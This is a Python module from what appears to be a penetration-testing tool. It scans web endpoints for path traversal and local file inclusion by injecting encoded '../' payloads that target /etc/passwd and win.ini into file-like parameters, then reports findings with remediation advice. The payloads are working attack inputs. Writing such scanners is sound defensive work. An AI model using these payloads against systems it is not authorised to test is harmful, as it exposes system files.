"""Path traversal / Local File Inclusion (LFI) testing."""

from __future__ import annotations

from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.session import PentestSession
from pencheff.modules.base import BaseTestModule

TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", ["root:x:0:0", "/bin/bash"]),
    ("....//....//....//etc/passwd", ["root:x:0:0"]),
    ("..%2f..%2f..%2fetc%2fpasswd", ["root:x:0:0"]),
    ("..%252f..%252f..%252fetc%252fpasswd", ["root:x:0:0"]),
    ("/etc/passwd", ["root:x:0:0"]),
    ("..\\..\\..\\windows\\win.ini", ["[fonts]", "[extensions]"]),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini", ["[fonts]"]),
]

FILE_PARAM_NAMES = [
    "file", "filename", "path", "filepath", "page", "template",
    "include", "doc", "document", "folder", "root", "dir",
    "load", "read", "content", "view", "cat", "type",
]


class PathTraversalModule(BaseTestModule):
    name = "path_traversal"
    category = "file_handling"
    owasp_categories = ["A01"]
    description = "Path traversal and Local File Inclusion testing"

    def get_techniques(self) -> list[str]:
        return ["classic_traversal", "encoding_bypass", "null_byte"]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings = []
        endpoints = self._get_target_endpoints(session, targets)

        # Find parameters likely to be file-related
        file_targets = []
        for ep in endpoints:
            for param in ep.get("params", []):
                if param.lower() in FILE_PARAM_NAMES:
                    file_targets.append((ep, param))

        for ep, param in file_targets[:15]:
            url = ep["url"]
            method = ep.get("method", "GET")

            for payload, markers in TRAVERSAL_PAYLOADS:
                try:
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)

                    if method == "GET":
                        qs[param] = [payload]
                        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                        resp = await http.get(test_url, module="path_traversal")
                    else:
                        body = {p: qs.get(p, [""])[0] for p in qs}
                        body[param] = payload
                        resp = await http.post(
                            url, body=urlencode(body),
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            module="path_traversal",
                        )

                    body_text = resp.text
                    if any(m in body_text for m in markers):
                        findings.append(Finding(
                            title="Path Traversal / Local File Inclusion",
                            severity=Severity.HIGH,
                            category="file_handling",
                            owasp_category="A01",
                            description=f"Path traversal in parameter '{param}'. "
                                        f"Payload '{payload}' read a local system file.",
                            remediation="Validate file paths against an allowlist. Use realpath() to resolve "
                                        "the path and verify it's within the expected directory.",
                            endpoint=url,
                            parameter=param,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            cvss_score=7.5,
                            cwe_id="CWE-22",
                            evidence=[Evidence(
                                request_method=method,
                                request_url=url,
                                request_body=f"{param}={payload}",
                                response_status=resp.status_code,
                                response_body_snippet=body_text[:300],
                                description="System file contents returned in response",
                            )],
                        ))
                        break  # Found for this param
                except Exception:
                    continue

        return findings
